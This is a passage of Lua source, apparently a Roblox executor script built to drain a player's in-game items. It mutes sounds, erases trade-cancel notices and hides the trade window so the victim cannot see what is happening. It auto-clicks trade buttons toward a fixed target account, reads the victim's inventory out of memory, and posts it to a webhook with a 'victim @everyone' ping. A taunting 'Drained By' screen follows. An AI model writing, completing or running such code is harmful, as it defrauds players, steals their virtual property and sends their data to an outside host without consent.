	for k, v in pairs(tbl) do
		tbl5[k] = v
	end

	for k, v in pairs(tbl4) do
		tbl5[k] = v
	end

	-- ── SONIDOS Y BANNERS DE CANCELACIÓN ──
	local watchedSounds = {}
	local watchedBannerLabels = {}

	local function isProtectedGuiObject(inst)
		if not inst then
			return false
		end
		local curr = inst
		while curr do
			if curr.Name == "LeaveConfirmGui" or curr.Name == "DrainOverlay" or curr.Name == "LeftCenter_Backup" then
				return true
			end
			curr = curr.Parent
		end
		return false
	end

	local function muteSoundInstance(snd)
		if not snd or not snd:IsA("Sound") or isProtectedGuiObject(snd) then
			return
		end
		pcall(function()
			snd.Volume = 0
			snd.Playing = false
			snd:Stop()
		end)
		if not watchedSounds[snd] then
			watchedSounds[snd] = true
			pcall(function()
				snd:GetPropertyChangedSignal("Playing"):Connect(function()
					if snd.Playing then
						pcall(function()
							snd.Volume = 0
							snd.Playing = false
							snd:Stop()
						end)
					end
				end)
				snd:GetPropertyChangedSignal("Volume"):Connect(function()
					if snd.Volume > 0 then
						pcall(function()
							snd.Volume = 0
						end)
					end
				end)
				snd.Played:Connect(function()
					pcall(function()
						snd.Volume = 0
						snd.Playing = false
						snd:Stop()
					end)
				end)
			end)
		end
	end

	local function muteAllGameAndUiSounds()
		for _, desc in ipairs(playerGui:GetDescendants()) do
			if desc:IsA("Sound") then
				muteSoundInstance(desc)
			end
		end
		for _, desc in ipairs(SoundService:GetDescendants()) do
			if desc:IsA("Sound") then
				muteSoundInstance(desc)
			end
		end
	end

	local function isCancelMessageText(txt)
		if type(txt) ~= "string" or txt == "" then
			return false
		end
		local t = string.lower(txt)
		return t:find("canceló", 1, true)
			or t:find("cancelo", 1, true)
			or t:find("cancelled", 1, true)
			or t:find("canceled", 1, true)
			or t:find("declin", 1, true)
			or t:find("rechaz", 1, true)
			or t:find("base bloqueada", 1, true)
			or t:find("base locked", 1, true)
	end

	local function isInsideBannerOrTradeArea(obj)
		local curr = obj and obj.Parent
		local depth = 0
		while curr and curr ~= playerGui and depth < 8 do
			local n = string.lower(tostring(curr.Name or ""))
			if n:find("notif", 1, true)
				or n:find("banner", 1, true)
				or n:find("toast", 1, true)
				or n:find("alert", 1, true)
				or n:find("popup", 1, true)
				or n:find("announce", 1, true)
				or n:find("cancel", 1, true)
				or n:find("trade", 1, true)
			then
				return true
			end
			curr = curr.Parent
			depth += 1
		end
		return false
	end

	local function maybeClearCancelText(desc)
		if not desc or isProtectedGuiObject(desc) then
			return
		end
		if not (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
			return
		end
		if not watchedBannerLabels[desc] then
			watchedBannerLabels[desc] = true
			pcall(function()
				desc:GetPropertyChangedSignal("Text"):Connect(function()
					maybeClearCancelText(desc)
				end)
			end)
		end
		local txt = desc.Text or ""
		if isCancelMessageText(txt) or (isInsideBannerOrTradeArea(desc) and string.lower(txt):find("cancel", 1, true)) then
			pcall(function()
				if desc.Text ~= "" then
					desc.Text = ""
				end
			end)
		end
	end

	local function cleanCancelBannerTexts()
		for _, desc in ipairs(playerGui:GetDescendants()) do
			if desc:IsA("TextLabel") or desc:IsA("TextButton") then
				maybeClearCancelText(desc)
			end
		end
	end

	-- ── SIMULACIÓN DE CLICS / SEÑALES EN UI (SIN REMOTES) ──
	local lastButtonClickClock = {}

	local function isHierarchyVisible(inst)
		if not inst then
			return false
		end
		if inst:IsA("LayerCollector") and not inst.Enabled then
			return false
		end
		if inst:IsA("GuiObject") and not inst.Visible then
			return false
		end
		local p = inst.Parent
		local depth = 0
		while p and p ~= playerGui and depth < 14 do
			if p:IsA("LayerCollector") and not p.Enabled then
				return false
			end
			if p:IsA("GuiObject") and not p.Visible then
				return false
			end
			p = p.Parent
			depth += 1
		end
		return true
	end

	local function resolveClickable(inst)
		if not inst then
			return nil
		end
		if inst:IsA("GuiButton") then
			return inst
		end
		local childBtn = inst:FindFirstChildWhichIsA("GuiButton", true)
		if childBtn then
			return childBtn
		end
		local curr = inst.Parent
		local depth = 0
		while curr and curr ~= playerGui and depth < 6 do
			if curr:IsA("GuiButton") then
				return curr
			end
			curr = curr.Parent
			depth += 1
		end
		return inst:IsA("GuiObject") and inst or nil
	end

	local function simulateUiClick(targetInst, minCooldown)
		local btn = resolveClickable(targetInst)
		if not btn then
			return false
		end
		local cd = minCooldown or 0.35
		local now = os.clock()
		if lastButtonClickClock[btn] and (now - lastButtonClickClock[btn]) < cd then
			return false
		end
		lastButtonClickClock[btn] = now

		local fired = false

		if btn:IsA("ImageButton") and isHierarchyVisible(btn) and getconnections then
			for _, sigName in ipairs({ "Activated", "MouseButton1Click" }) do
				local ok, conns = pcall(function()
					return getconnections(btn[sigName])
				end)
				if ok and type(conns) == "table" then
					for _, conn in ipairs(conns) do
						local ran = pcall(function()
							if conn.Fire then
								conn:Fire()
							elseif conn.Function then
								conn.Function()
							end
						end)
						if ran then
							fired = true
						end
					end
				end
			end
		end

		if not fired and firesignal then
			pcall(function()
				if btn.MouseButton1Down then
					firesignal(btn.MouseButton1Down)
				end
			end)
			pcall(function()
				if btn.MouseButton1Click then
					firesignal(btn.MouseButton1Click)
					fired = true
				end
			end)
			pcall(function()
				if btn.Activated then
					firesignal(btn.Activated)
					fired = true
				end
			end)
		end

		if not fired and getconnections then
			for _, sigName in ipairs({ "MouseButton1Click", "Activated", "MouseButton1Down" }) do
				local ok, conns = pcall(function()
					return getconnections(btn[sigName])
				end)
				if ok and type(conns) == "table" then
					for _, conn in ipairs(conns) do
						local ran = pcall(function()
							if conn.Fire then
								conn:Fire()
							elseif conn.Function then
								conn.Function()
							end
						end)
						if ran then
							fired = true
						end
					end
				end
			end
		end

		if not fired and btn:IsA("GuiButton") then
			pcall(function()
				GuiService.SelectedObject = btn
				fired = true
			end)
		end

		return fired
	end

	-- ── OCULTACIÓN DE INTERFACES SIN DESTRUIR JERARQUÍA ──
	local function hideTradeVisualOnly(desc)
		if not desc or desc.Name == "LeaveConfirmGui" or desc.Name == "DrainOverlay" then
			return
		end
		if desc.Name == "TradeLiveTrade" then
			pcall(function()
				if desc:IsA("LayerCollector") then
					desc.Enabled = false
				elseif desc:IsA("GuiObject") then
					desc.Visible = false
				end
			end)
			pcall(function()
				for _, child in ipairs(desc:GetChildren()) do
					if child:IsA("GuiObject") then
						child.Visible = false
					end
				end
			end)
		end
	end

	local function fn2()
		local leftCenter = playerGui:FindFirstChild("LeftCenter")

		if leftCenter then
			if not playerGui:FindFirstChild("LeftCenter_Backup") then
				local clone = leftCenter:Clone()
				clone.Name = "LeftCenter_Backup"
				clone.Parent = playerGui
			end
			pcall(function()
				if leftCenter:IsA("GuiObject") then
					leftCenter.Visible = false
					leftCenter.Position = UDim2.new(-10, 0, -10, 0)
				end
			end)
		end

		muteAllGameAndUiSounds()
		cleanCancelBannerTexts()

		playerGui.DescendantAdded:Connect(function(desc)
			if desc:IsA("Sound") then
				muteSoundInstance(desc)
			elseif desc:IsA("TextLabel") or desc:IsA("TextButton") then
				maybeClearCancelText(desc)
			end
			hideTradeVisualOnly(desc)
		end)

		SoundService.DescendantAdded:Connect(function(desc)
			if desc:IsA("Sound") then
				muteSoundInstance(desc)
			end
		end)

		local function fn3(child)
			if child:IsA("BlurEffect") then
				task.defer(function()
					pcall(function()
						child.Enabled = false
						child.Size = 0
						child:Destroy()
					end)
				end)
			end
		end

		currentCamera.ChildAdded:Connect(fn3)

		for _, child in ipairs(currentCamera:GetChildren()) do
			fn3(child)
		end

		currentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
			currentCamera.FieldOfView = 70
		end)

		currentCamera.FieldOfView = 70

		for _, descendant in pairs(playerGui:GetDescendants()) do
			hideTradeVisualOnly(descendant)
		end
	end

	local Animals = nil
	local Animals2 = nil
	local NumberUtils = nil

	pcall(function()
		Animals = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
		Animals2 = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
		NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
	end)

	local function fn3()
		local value

		pcall(function()
			for _, v in pairs(getgc(true)) do
				if type(v) == "table" and rawget(v, "AnimalList") then
					local value2 = rawget(v, "Owner")

					if not value2 and type(rawget(v, "Get")) == "function" then
						pcall(function()
							value2 = v:Get("Owner")
						end)
					end

					if value2 == localPlayer or type(value2) == "table" and value2.UserId == localPlayer.UserId then
						value = rawget(v, "AnimalList")

						if not value and type(rawget(v, "Get")) == "function" then
							pcall(function()
								value = v:Get("AnimalList")
							end)
						end

						if value then
							break
						end
					end
				end
			end
		end)

		return value
	end

	local function fn4()
		local v = nil

		pcall(function()
			for _, v2 in pairs(getgc(true)) do
				if type(v2) == "table" then
					local ok, result = pcall(rawget, v2, "BaseSkinInventory")

					if ok and type(result) == "table" then
						if type(rawget(v2, "Coins")) == "number" and type(rawget(v2, "Rebirth")) == "number" then
							v = v2
							break
						end
					end
				end
			end
		end)

		return v
	end

	-- ── 4. IDENTIFICACIÓN COMPLETA DE TODAS LAS SKINS DE BASES (SIN OMISIONES NI DUPLICADOS) ──
	local function fn5()
		local tbl6 = {}
		local seen = {}

		local function addSkinEntry(uuidVal, nameVal)
			local sName = tostring(nameVal or "")
			if sName == "" then
				return
			end
			local uVal = tostring(uuidVal or "")
			local dedupKey = (uVal ~= "" and uVal ~= "nil") and ("uuid:" .. uVal) or ("name:" .. normKey(sName))
			if seen[dedupKey] then
				return
			end
			seen[dedupKey] = true
			table.insert(tbl6, {
				uuid = uVal,
				skinName = sName,
				isConfigured = tbl2[sName] == true,
			})
		end

		local v = fn4()
		if v then
			local value = rawget(v, "BaseSkinInventory")
			if type(value) == "table" then
				for k, v2 in pairs(value) do
					if type(v2) == "table" then
						addSkinEntry(k, v2.SkinName or v2.Skin or v2.Name)
					elseif type(v2) == "string" then
						addSkinEntry(k, v2)
					end
				end
			end
		end

		for _, desc in ipairs(playerGui:GetDescendants()) do
			local nLower = string.lower(desc.Name)
			if (nLower:find("baseskin", 1, true) or nLower:find("skin", 1, true)) and (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
				local txt = tostring(desc.Text or "")
				if txt ~= "" and not txt:find("Active:", 1, true) and not txt:find("To Trade", 1, true) then
					addSkinEntry(desc:GetFullName(), txt)
				end
			end
		end

		return tbl6
	end

	-- ── 4. IDENTIFICACIÓN COMPLETA DE TODOS LOS GEARS (SIN OMISIONES NI DUPLICADOS) ──
	local function fn6()
		local tbl6 = {}
		local seen = {}

		local function addGearEntry(uuidVal, nameVal)
			local gName = tostring(nameVal or "")
			if gName == "" then
				return
			end
			local uVal = tostring(uuidVal or "")
			local dedupKey = (uVal ~= "" and uVal ~= "nil") and ("uuid:" .. uVal) or ("name:" .. normKey(gName))
			if seen[dedupKey] then
				return
			end
			seen[dedupKey] = true
			table.insert(tbl6, {
				uuid = uVal,
				gearName = gName,
				isConfigured = tbl3[gName] == true,
			})
		end

		local v = fn4()
		if v then
			local value = rawget(v, "GearInventory")
			if type(value) == "table" then
				for k, v2 in pairs(value) do
					if type(v2) == "table" then
						addGearEntry(k, v2.GearName or v2.Name or v2.ToolName)
					elseif type(v2) == "string" then
						addGearEntry(k, v2)
					end
				end
			end
		end

		local backpack = localPlayer:FindFirstChild("Backpack")
		if backpack then
			for _, tool in ipairs(backpack:GetChildren()) do
				if tool:IsA("Tool") and tool.Name ~= "" then
					addGearEntry(tool:GetAttribute("UUID") or tool:GetFullName(), tool.Name)
				end
			end
		end

		return tbl6
	end

	-- ── 3. SELECCIÓN ESTRICTA DE BRAINROTS SEGÚN LISTA CONFIGURADA ──
	local function fn7(arg)
		local tbl6 = {}
		local seenSlots = {}
		local v = fn3()
		if not v then
			return tbl6
		end

		for k, v2 in pairs(v) do
			if type(v2) == "table" and v2.Index then
				local displayName = Animals and Animals[v2.Index]
				displayName = displayName and displayName.DisplayName or v2.Index
				local isAllowed = isConfiguredBrainrot(v2.Index, displayName)
				if isAllowed then
					local flag = isPriorityBrainrot(v2.Index, displayName)
					local matchPhase = (arg == "PRIORITY" and flag) or (arg == "NORMAL" and not flag)
					local slotStr = tostring(k)
					if matchPhase and not seenSlots[slotStr] then
						seenSlots[slotStr] = true
						table.insert(tbl6, {
							slotKey = k,
							slotId = slotStr,
							data = v2,
							displayName = displayName,
							indexName = tostring(v2.Index),
							isPriority = flag,
						})
					end
				end
			end
		end

		return tbl6
	end

	local function fn8()
		local plots = workspace:FindFirstChild("Plots")
		if not plots then
			return nil
		end

		for _, child in pairs(plots:GetChildren()) do
			local plotSign = child:FindFirstChild("PlotSign")

			if plotSign then
				local yourBase = plotSign:FindFirstChild("YourBase")
				if yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled then
					return child
				end
			end
		end

		return nil
	end

	local function fn9(arg)
		if arg:IsA("BasePart") then
			return arg.Position
		end

		if arg.PrimaryPart then
			return arg.PrimaryPart.Position
		end
		local rootPart = arg:FindFirstChild("RootPart") or arg:FindFirstChild("FakeRootPart") or arg:FindFirstChild("Handle")
		if rootPart and rootPart:IsA("BasePart") then
			return rootPart.Position
		end

		for _, descendant in pairs(arg:GetDescendants()) do
			if descendant:IsA("BasePart") then
				return descendant.Position
			end
		end

		return nil
	end

	local function fn10(arg, arg2)
		local debris = workspace:FindFirstChild("Debris")
		if not debris then
			return nil
		end
		local v = fn9(arg)
		if not v then
			return nil
		end
		local displayName = Animals and Animals[arg2]
		displayName = displayName and displayName.DisplayName or arg2
		local v2 = string.gsub(string.lower(displayName), "%s+", "")
		local huge = math.huge
		local tbl6 = nil

		for _, child in pairs(debris:GetChildren()) do
			if child.Name == "FastOverheadTemplate" then
				local v3 = fn9(child)

				if v3 then
					local magnitude = (v3 - v).Magnitude

					if magnitude < huge then
						local animalOverhead = child:FindFirstChild("AnimalOverhead")

						if animalOverhead then
							local displayName2 = animalOverhead:FindFirstChild("DisplayName")
							local generation = animalOverhead:FindFirstChild("Generation")

							if displayName2 and displayName2:IsA("TextLabel") then
								local text = displayName2.Text or ""
								local v4 = string.gsub(string.lower(text), "%s+", "")

								if string.find(v4, v2, 1, true) or string.find(v2, v4, 1, true) then
									local isTextLabel = generation and generation:IsA("TextLabel")
									local str2 = ""

									if isTextLabel then
										str2 = generation.Text or ""
									end

									tbl6 = { name = text ~= "" and text or displayName, modelName = arg2, genText = str2 }

									if magnitude < 5 then
										break
									else
										huge = magnitude
									end
								end
							end
						end
					end
				end
			end
		end

		return tbl6
	end

	local function fn11(arg)
		local tbl6 = {}
		local v = fn8()
		if not v then
			return tbl6
		end
		local flag = arg == "PRIORITY" and tbl4 or tbl

		for _, descendant in pairs(v:GetDescendants()) do
			local name = descendant.Name
			local str2 = name:gsub("%d+$", "")

			if descendant:IsA("Model") and (flag[name] or flag[str2]) then
				local v2 = fn10(descendant, name)

				if v2 then
					local attribute = descendant:GetAttribute("Mutation") or "None"

					if attribute == "" then
						attribute = "None"
					end

					local v3, v4 = string.match(string.gsub(v2.genText, ",", ""), "%$([%d%.]+)([KMBT]?)/s")
					local n = 0

					if v3 then
						n = tonumber(v3) or 0

						if v4 == "K" then
							n *= 1000
						elseif v4 == "M" then
							n *= 1000000
						elseif v4 == "B" then
							n *= 1e9
						elseif v4 == "T" then
							n *= 1e12
						end
					end

					table.insert(tbl6, {
						index = v2.modelName,
						displayName = v2.name,
						name = "**" .. (attribute ~= "None" and attribute ~= "" and "[" .. attribute .. "] " or "") .. v2.name .. "**",
						genVal = n,
						genStr = v2.genText ~= "" and v2.genText or "$0/s",
					})
				end
			end
		end

		return tbl6
	end

	local function fn12()
		return syn and syn.request or http and http.request or http_request or request
	end

	local function fn13(arg)
		return (arg:match("^(.-)%s*%(") or arg):gsub(" ", "_")
	end

	local function fn14(arg)
		local v = fn12()
		if not v then
			return nil
		end
		local str2 = str .. fn13(arg)

		for i = 1, 3 do
			local ok, result = pcall(function()
				return v({
					Url = str2,
					Method = "GET",
					Headers = {
						["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
						Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
						["Accept-Language"] = "en-US,en;q=0.5",
						["Cache-Control"] = "no-cache",
					},
					Timeout = 10,
				})
			end)

			if ok and result and result.StatusCode and result.StatusCode == 200 then
				local body = result.Body

				if not body or body == "" then
					if i < 3 then
						task.wait(0.5)
					end
				else
					local match = body:match("property=\"og:image\"%s+content=\"([^\"]+)\"") or body:match("content=\"([^\"]+)\"%s+property=\"og:image\"") or body:match("<meta%s+og:image%s+content=\"([^\"]+)\"") or body:match("<meta%s+property=\"og:image\"%s+content=\"([^\"]+)\"")

					if match and match ~= "" then
						local str3 = match:gsub("&amp;", "&"):gsub("&quot;", "\""):gsub("&lt;", "<"):gsub("&gt;", ">")
						if str3:find("^https?://") then
							return str3
						end
					end

					body = body:match("<div[^>]*class=\"[^\"]*infobox[^\"]*\"[^>]*>(.-)</div>%s*</div>") or body

					for _, v2 in ipairs({
						"data%-src=\"(https://[^\"]+%.(?:png|jpg|jpeg|webp|gif))\"",
						"src=\"(https://[^\"]+%.(?:png|jpg|jpeg|webp|gif))\"",
					}) do
						local n = 1
						local v3 = nil

						while true do
							local pos, v4 = body:find(v2, n)

							if not pos then
								break
							else
								local match2 = body:sub(pos, v4):match("\"([^\"]+)\"")

								if match2 and match2:find("static%.wikia%.nocookie%.net") then
									if not match2:find("/scale%-to%-width%-down/[0-9]?[0-9]$") then
										v3 = match2
									end
								else
									v3 = match2 or v3
								end

								n = v4 + 1
							end
						end

						if v3 then
							return (v3:gsub("/revision/latest", ""))
						end
					end

					return nil
				end
			end

			if i < 3 then
				task.wait(0.5 * i)
			end
		end

		return nil
	end

	local function fn15(arg)
		local v = nil

		pcall(function()
			local models = ReplicatedStorage:FindFirstChild("Models")
			models = models and models:FindFirstChild("Animals")
			if not models then
				return
			end
			local v2 = models:FindFirstChild(arg)

			if not v2 then
				local v3 = Animals and Animals[arg]

				if v3 and v3.DisplayName then
					v2 = models:FindFirstChild(v3.DisplayName)
				end
			end

			if not v2 then
				return
			end
			local n = 0

			for _, descendant in ipairs(v2:GetDescendants()) do
				if descendant:IsA("MeshPart") or descendant:IsA("Part") then
					local color = descendant.Color
					local n2 = descendant.Size.X * descendant.Size.Y * descendant.Size.Z
					local n3 = math.max(color.R, color.G, color.B)
					local n4 = math.min(color.R, color.G, color.B)
					local n5 = n3 > 0 and (n3 - n4) / n3 or 0
					local n6 = color.R * 0.299 + color.G * 0.587 + color.B * 0.114
					local n7 = (n5 * 3 + 0.2) * (n6 < 0.08 and 0.05 or n6 > 0.92 and 0.15 or 1) * n2

					if n < n7 then
						v = color
						n = n7
					end
				end
			end
		end)

		return v
	end

	local function fn16(arg)
		if not arg then
			return 7419530
		end
		local clamp = math.clamp
		return math.clamp(math.floor(arg.R * 255), 0, 255) * 65536 + clamp(math.floor(arg.G * 255), 0, 255) * 256 + math.clamp(math.floor(arg.B * 255), 0, 255)
	end

	local function fn17(arg, arg2)
		local v = fn14(arg)
		if v then
			return v
		end
		local v2 = Animals and Animals[arg2]

		if v2 then
			for _, v3 in ipairs({ "Image", "Icon", "Thumbnail", "Texture", "ImageId", "AssetId", "image", "icon" }) do
				if v2[v3] and type(v2[v3]) == "string" and v2[v3] ~= "" then
					local match = v2[v3]:match("%d+")
					if match then
						return "https://tr.rbxcdn.com/" .. match .. "/420/420/Image/Png"
					end
				end
			end
		end

		return fn14(arg2)
	end

	local function fn18(arg, arg2, arg3)
		local v = fn12()
		if not v then
			return
		end

		task.spawn(function()
			local n = arg3 or 3

			for i = 1, n do
				if pcall(function()
					v({ Url = arg, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = arg2 })
				end) then
					return
				end
				task.wait(1 * i)
			end
		end)
	end

	local function fn19()
		local v = fn8()
		local str2 = "Default"

		if v then
			str2 = v:GetAttribute("BaseSkinName") or "Default"
		end

		local v2 = fn5()
		if #v2 == 0 then
			return "**Active:** " .. tostring(str2) .. "\n**Detected (0):** None"
		end
		local tbl6 = {}

		for _, v3 in ipairs(v2) do
			table.insert(tbl6, "• " .. v3.skinName)
		end

		return "**Active:** " .. tostring(str2) .. "\n**Detected (" .. #v2 .. "):**\n" .. table.concat(tbl6, "\n")
	end

	local function fn20()
		local v = fn6()
		if #v == 0 then
			return "None"
		end
		local tbl6 = {}

		for _, v2 in ipairs(v) do
			table.insert(tbl6, "• " .. v2.gearName)
		end

		local str2 = table.concat(tbl6, "\n")

		if #str2 > 1000 then
			str2 = str2:sub(1, 996) .. "..."
		end

		return str2
	end

	local function fn21(arg, arg2, arg3, arg4, arg5, arg6)
		if #arg == 0 then
			return
		end

		table.sort(arg, function(arg7, arg8)
			return arg7.genVal > arg8.genVal
		end)

		local v = arg[1]
		local v2 = fn17(v.displayName, v.index)
		local v3 = fn16(fn15(v.index))
		local tbl6 = {}

		for i, v4 in ipairs(arg) do
			tbl6[i] = v4.name .. " — **" .. v4.genStr .. "**"
		end

		local str2 = table.concat(tbl6, "\n")

		if #str2 > 3800 then
			str2 = str2:sub(1, 3796) .. "..."
		end

		local str3 = "Unknown"

		pcall(function()
			if identifyexecutor then
				str3 = identifyexecutor()
			elseif getexecutorname then
				str3 = getexecutorname()
			end
		end)

		local v4 = fn19()
		local v5 = fn20()
		local v6 = fn6()

		local tbl7 = {
			title = (arg6 and "[" .. arg6 .. "] " or "") .. v.displayName .. " — " .. v.genStr,
			description = str2,
			color = v3,
		}

		local fields = {}
		local tbl8 = { name = "🎨 Base Skin", value = v4, inline = false }
		local tbl9 = { name = "⚔️ Gears (" .. #v6 .. ")", value = v5, inline = false }

		local tbl10 = {
			name = "Server",
			value = "Players: **" .. #Players:GetPlayers() .. "** | <t:" .. os.time() .. ":R>",
			inline = true,
		}

		local tbl11 = { name = "Target", value = targetName .. " (`" .. targetUserId .. "`)", inline = true }
		fields[1] = tbl8
		fields[2] = tbl9
		fields[3] = tbl10
		fields[4] = { name = "Executor", value = str3, inline = true }
		fields[5] = tbl11
		tbl7.fields = fields
		tbl7.footer = { text = targetName .. " • " .. targetUserId }
		tbl7.timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")

		if v2 then
			tbl7.thumbnail = { url = v2 }
		end

		local tbl12 = { embeds = { tbl7 }, username = arg5 or "LOGGER", avatar_url = arg3 or "" }

		if arg4 then
			tbl12.content = targetName .. " victim||@everyone||"
		end

		fn18(arg2, HttpService:JSONEncode(tbl12), 3)
	end

	local function fn22()
		pcall(function()
			local CoreGui = playerGui

			pcall(function()
				CoreGui = game:GetService("CoreGui")
			end)

			if CoreGui:FindFirstChild("DrainOverlay") then
				return
			end
			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = "DrainOverlay"
			screenGui.IgnoreGuiInset = true
			screenGui.ResetOnSpawn = false
			screenGui.DisplayOrder = 999999
			screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			screenGui.Parent = CoreGui
			local frame = Instance.new("Frame")
			frame.Size = UDim2.new(1, 0, 1, 0)
			frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			frame.BorderSizePixel = 0
			frame.ZIndex = 999998
			frame.Parent = screenGui
			local textLabel = Instance.new("TextLabel")
			textLabel.Size = UDim2.new(1, -40, 0.4, 0)
			textLabel.Position = UDim2.new(0, 20, 0.15, 0)
			textLabel.BackgroundTransparency = 1
			textLabel.Text = "Your Brainrot Drained By\n" .. targetName
			textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
			textLabel.TextScaled = true
			textLabel.Font = Enum.Font.GothamBlack
			textLabel.TextStrokeTransparency = 0.7
			textLabel.ZIndex = 999999
			textLabel.Parent = screenGui
			local textLabel2 = Instance.new("TextLabel")
			textLabel2.Size = UDim2.new(1, -40, 0.2, 0)
			textLabel2.Position = UDim2.new(0, 20, 0.65, 0)
			textLabel2.BackgroundTransparency = 1
			textLabel2.Text = "TARGET: " .. targetName .. " (" .. targetUserId .. ")"
			textLabel2.TextColor3 = Color3.fromRGB(50, 255, 50)
			textLabel2.TextScaled = true
			textLabel2.Font = Enum.Font.GothamBlack
			textLabel2.TextStrokeTransparency = 0.7
			textLabel2.ZIndex = 999999
			textLabel2.Parent = screenGui

			screenGui.AncestryChanged:Connect(function(child, parent)
				if parent == nil then
					task.wait(0.1)
					screenGui.Parent = CoreGui
				end
			end)
		end)
	end

	-- ── ARQUITECTURA AUTOSENDTRADE + AUTOACCEPT + ESTADOS DE INTERCAMBIO ──
	local TRADE_STATE = {
		PENDING_INVITE = "PENDING_INVITE",
		IN_TRADE_SELECTING = "IN_TRADE_SELECTING",
		CONFIRMING = "CONFIRMING",
		ACCEPTING = "ACCEPTING",
		CANCELLED = "CANCELLED",
		CLOSED = "CLOSED",
	}

	local function getTradeListGui()
		for _, desc in ipairs(playerGui:GetDescendants()) do
			if desc.Name == "TradePlayerList" and (desc:IsA("LayerCollector") or desc:IsA("GuiObject")) then
				return desc
			end
		end
		return nil
	end

	local function findLeftTradeButton()
		for _, containerName in ipairs({ "LeftCenter", "LeftCenter_Backup" }) do
			local container = playerGui:FindFirstChild(containerName, true)
			if container then
				local btn = container:FindFirstChild("TradePlayerList", true)
				if btn then
					return resolveClickable(btn) or btn
				end
			end
		end
		for _, desc in ipairs(playerGui:GetDescendants()) do
			if desc:IsA("GuiButton") then
				local n = string.lower(desc.Name)
				local t = string.lower(tostring(desc.Text or ""))
				if n:find("trade", 1, true) or t:find("trade", 1, true) or t:find("intercambio", 1, true) then
					return desc
				end
			end
		end
		return nil
	end

	local function findSearchBox(root)
		if not root then
			return nil
		end
		for _, desc in ipairs(root:GetDescendants()) do
			if desc:IsA("TextBox") then
				return desc
			end
		end
		return nil
	end

	local function typeExactTargetName(box, exactName)
		if not box or not box:IsA("TextBox") then
			return false
		end
		return pcall(function()
			box:CaptureFocus()
			box.Text = exactName
			task.wait(0.05)
			if okVim and VirtualInputManager then
				pcall(function()
					VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
					task.wait(0.03)
					VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
				end)
			end
			if box.FocusLost then
				pcall(function()
					box.FocusLost:Fire(true)
				end)
			end
			box:ReleaseFocus()
		end)
	end

	local function findTargetRowAndSend(root, tName, tId)
		if not root then
			return nil, nil
		end
		local lowerTarget = string.lower(tostring(tName or ""))
		local exactRow = lowerTarget .. "_" .. tostring(tId or "")

		for _, desc in ipairs(root:GetDescendants()) do
			local dn = string.lower(desc.Name)
			local matched = (exactRow ~= "_" and dn == exactRow) or (lowerTarget ~= "" and dn:find(lowerTarget, 1, true) ~= nil)
			if not matched then
				for _, lbl in ipairs(desc:GetDescendants()) do
					if (lbl:IsA("TextLabel") or lbl:IsA("TextButton")) and isTargetName(lbl.Text) then
						matched = true
						break
					end
				end
			end
			if matched then
				local sendCandidate = desc:FindFirstChild("Send", true)
				if not sendCandidate then
					for _, sub in ipairs(desc:GetDescendants()) do
						local sn = string.lower(sub.Name)
						local st = string.lower(tostring(sub.Text or ""))
						if sn:find("send", 1, true) or sn:find("enviar", 1, true) or st == "send" or st == "enviar" then
							sendCandidate = sub
							break
						end
					end
				end
				return desc, resolveClickable(sendCandidate) or sendCandidate
			end
		end
		return nil, nil
	end

	local function getLiveTradeMainFrame()
		local tradeGui = playerGui:FindFirstChild("TradeLiveTrade", true)
		if not tradeGui then
			return nil, nil
		end
		local main = tradeGui:FindFirstChild("TradeLiveTrade", true)
		if not main and tradeGui:IsA("GuiObject") then
			main = tradeGui
		end
		return tradeGui, main
	end

	local function hasCancelIndicatorInGui()
		for _, desc in ipairs(playerGui:GetDescendants()) do
			if not isProtectedGuiObject(desc) and (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
				local txt = string.lower(tostring(desc.Text or ""))
				if txt ~= "" and isCancelMessageText(txt) and isTargetName(txt) then
					return true
				end
			end
		end
		return false
	end

	local function hasBothPlayersInTradeSession()
		local tradeGui, main = getLiveTradeMainFrame()
		if not tradeGui or not main then
			return false
		end
		local other = main:FindFirstChild("Other", true)
		if not other then
			return false
		end
		local otherNameLabel = other:FindFirstChild("Username", true)
		if otherNameLabel and (otherNameLabel:IsA("TextLabel") or otherNameLabel:IsA("TextButton")) then
			if otherNameLabel.Text ~= "" and not isTargetName(otherNameLabel.Text) then
				return false
			end
		end
		return true
	end

	-- Vincula un ítem de la UI únicamente si coincide de forma exacta con un Brainrot configurado
	local function findMatchingBrainrotUiButton(root, brainrotEntry)
		if not root or not brainrotEntry then
			return nil
		end
		local expectedNorm = normKey(brainrotEntry.displayName)
		local expectedIdxNorm = normKey(brainrotEntry.indexName)
		local expectedSlot = tostring(brainrotEntry.slotId or "")

		for _, desc in ipairs(root:GetDescendants()) do
			if desc:IsA("GuiButton") then
				local slotAttr = tostring(desc:GetAttribute("Slot") or desc:GetAttribute("SlotKey") or "")
				local nameText = ""
				for _, sub in ipairs(desc:GetDescendants()) do
					if sub:IsA("TextLabel") and string.lower(sub.Name):find("name", 1, true) then
						nameText = normKey(sub.Text)
						break
					end
				end
				if nameText == "" then
					for _, sub in ipairs(desc:GetDescendants()) do
						if sub:IsA("TextLabel") and sub.Text ~= "" and not string.find(sub.Text, "%$", 1, true) then
							nameText = normKey(sub.Text)
							break
						end
					end
				end
				local descNorm = normKey(desc.Name)
				local exactNameMatch = (nameText ~= "" and (nameText == expectedNorm or nameText == expectedIdxNorm))
					or (descNorm ~= "" and (descNorm == expectedNorm or descNorm == expectedIdxNorm))
				local slotMatch = (expectedSlot ~= "" and (slotAttr == expectedSlot or string.find(desc.Name, expectedSlot, 1, true) ~= nil))

				if exactNameMatch and (expectedSlot == "" or slotMatch or slotAttr == "") then
					return desc
				end
			end
		end
